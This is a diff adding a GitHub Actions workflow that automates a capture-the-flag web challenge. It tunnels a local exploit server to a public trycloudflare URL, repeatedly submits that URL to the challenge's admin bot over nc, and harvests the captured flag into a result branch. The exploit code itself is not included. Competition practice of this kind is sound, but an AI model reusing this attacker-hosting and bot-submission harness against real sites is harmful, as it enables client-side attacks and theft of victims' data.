@@ -1,0 +1,188 @@
+name: Chronostasis live watchdog
+
+on:
+  push:
+    branches:
+      - ctf-chronostasis-live-20260814
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  solve:
+    runs-on: ubuntu-latest
+    timeout-minutes: 330
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ctf-chronostasis-live-20260814
+
+      - name: Keep intended iframe exploit live and retry access point
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          RESULT_BRANCH: ctf-chronostasis-result-20260814
+        run: |
+          set -uo pipefail
+          mkdir -p evidence
+          : > evidence/watchdog.log
+          : > evidence/bot-all.log
+          : > evidence/server.log
+          : > evidence/tunnel.log
+
+          SOLVER=$(grep -RIl --include='*.py' -- '--public-origin' . 2>/dev/null | head -1 || true)
+          if [ -z "${SOLVER}" ]; then
+            SOLVER=$(find . -type f -name '*.py' | grep -E 'chronostasis|ctf-live|solver|server' | head -1 || true)
+          fi
+          if [ -z "${SOLVER}" ]; then
+            echo 'No exploit server Python file found' | tee -a evidence/watchdog.log
+            find . -maxdepth 4 -type f | sort | tee -a evidence/watchdog.log
+            exit 1
+          fi
+          echo "solver=${SOLVER}" | tee -a evidence/watchdog.log
+          python3 "${SOLVER}" --help > evidence/solver-help.txt 2>&1 || true
+
+          curl -fsSL --retry 5 --retry-delay 3 \
+            https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
+            -o cloudflared
+          chmod +x cloudflared
+          ./cloudflared tunnel --url http://127.0.0.1:8000 --no-autoupdate \
+            > evidence/tunnel.log 2>&1 &
+          TUNNEL_PID=$!
+
+          PUBLIC_ORIGIN=''
+          for i in $(seq 1 90); do
+            PUBLIC_ORIGIN=$(grep -Eo 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' evidence/tunnel.log | tail -1 || true)
+            [ -n "${PUBLIC_ORIGIN}" ] && break
+            sleep 2
+          done
+          if [ -z "${PUBLIC_ORIGIN}" ]; then
+            echo 'Tunnel URL was not allocated' | tee -a evidence/watchdog.log
+            cat evidence/tunnel.log
+            exit 1
+          fi
+          echo "public_origin=${PUBLIC_ORIGIN}" | tee -a evidence/watchdog.log
+
+          python3 -u "${SOLVER}" \
+            --public-origin "${PUBLIC_ORIGIN}" \
+            --challenge-origin 'http://web:1337' \
+            --port 8000 > evidence/server.log 2>&1 &
+          SERVER_PID=$!
+
+          for i in $(seq 1 60); do
+            if curl -fsS --max-time 5 http://127.0.0.1:8000/ -o /dev/null 2>/dev/null || \
+               curl -fsS --max-time 5 http://127.0.0.1:8000/start -o /dev/null 2>/dev/null; then
+              break
+            fi
+            if ! kill -0 "${SERVER_PID}" 2>/dev/null; then
+              echo 'Exploit server exited during startup' | tee -a evidence/watchdog.log
+              cat evidence/server.log
+              exit 1
+            fi
+            sleep 2
+          done
+
+          extract_flag() {
+            python3 - <<'PY'
+          import re
+          from pathlib import Path
+          vals=[]
+          for p in Path('evidence').glob('*'):
+              if not p.is_file() or p.stat().st_size > 50_000_000:
+                  continue
+              try:
+                  s=p.read_text(errors='replace')
+              except Exception:
+                  continue
+              vals.extend(re.findall(r'rewrite\{[^}\r\n]{1,500}\}', s))
+          seen=[]
+          for v in vals:
+              if v not in seen:
+                  seen.append(v)
+          print(seen[0] if seen else '')
+          PY
+          }
+
+          FLAG=''
+          BOT_ATTEMPT=0
+          END=$(( $(date +%s) + 19000 ))
+          while [ "$(date +%s)" -lt "${END}" ]; do
+            FLAG=$(extract_flag)
+            [ -n "${FLAG}" ] && break
+
+            if ! kill -0 "${SERVER_PID}" 2>/dev/null; then
+              echo "$(date -u +%FT%TZ) exploit server died" | tee -a evidence/watchdog.log
+              break
+            fi
+            if ! kill -0 "${TUNNEL_PID}" 2>/dev/null; then
+              echo "$(date -u +%FT%TZ) tunnel died" | tee -a evidence/watchdog.log
+              break
+            fi
+
+            if ! curl -fsS --max-time 5 http://challenge.rewritelab.org:35465/ -o /dev/null 2>/dev/null; then
+              echo "$(date -u +%FT%TZ) access point offline" | tee -a evidence/watchdog.log
+              sleep 10
+              continue
+            fi
+
+            BOT_ATTEMPT=$((BOT_ATTEMPT + 1))
+            URL="${PUBLIC_ORIGIN}/start?t=${GITHUB_RUN_ID}-${BOT_ATTEMPT}-$(date +%s)"
+            echo "$(date -u +%FT%TZ) submit attempt ${BOT_ATTEMPT}: ${URL}" | tee -a evidence/watchdog.log
+            : > evidence/bot-current.log
+            { printf '%s\n' "${URL}"; sleep 1; } | \
+              timeout 65s nc -v challenge.rewritelab.org 35466 2>&1 | \
+              tee evidence/bot-current.log || true
+            cat evidence/bot-current.log >> evidence/bot-all.log
+            printf '\n--- attempt %s end ---\n' "${BOT_ATTEMPT}" >> evidence/bot-all.log
+            FLAG=$(extract_flag)
+            [ -n "${FLAG}" ] && break
+            sleep 15
+          done
+
+          if [ -n "${FLAG}" ]; then
+            printf '%s\n' "${FLAG}" > evidence/flag.txt
+            {
+              echo FLAG_FOUND
+              echo "${FLAG}"
+              echo "bot_attempt=${BOT_ATTEMPT}"
+              date -u +%FT%TZ
+            } > evidence/status.txt
+          else
+            {
+              echo NO_FLAG_FOUND
+              echo "bot_attempts=${BOT_ATTEMPT}"
+              date -u +%FT%TZ
+              echo '--- server tail ---'
+              tail -200 evidence/server.log
+              echo '--- tunnel tail ---'
+              tail -100 evidence/tunnel.log
+              echo '--- bot tail ---'
+              tail -300 evidence/bot-all.log
+            } > evidence/status.txt
+          fi
+
+          git clone --depth 1 --branch "${RESULT_BRANCH}" \
+            "https://x-access-token:${GH_TOKEN}@github.com/${REPO}.git" result-repo
+          mkdir -p result-repo/ctf-result
+          cp evidence/status.txt result-repo/ctf-result/watchdog-status.txt
+          if [ -f evidence/flag.txt ]; then
+            cp evidence/flag.txt result-repo/ctf-result/flag.txt
+          fi
+          cd result-repo
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add ctf-result
+          if ! git diff --cached --quiet; then
+            git commit -m '[ctf-result] persist watchdog result'
+            git push origin HEAD:"${RESULT_BRANCH}"
+          fi
+
+      - name: Upload watchdog evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: chronostasis-watchdog-${{ github.run_id }}
+          path: evidence
+          if-no-files-found: warn
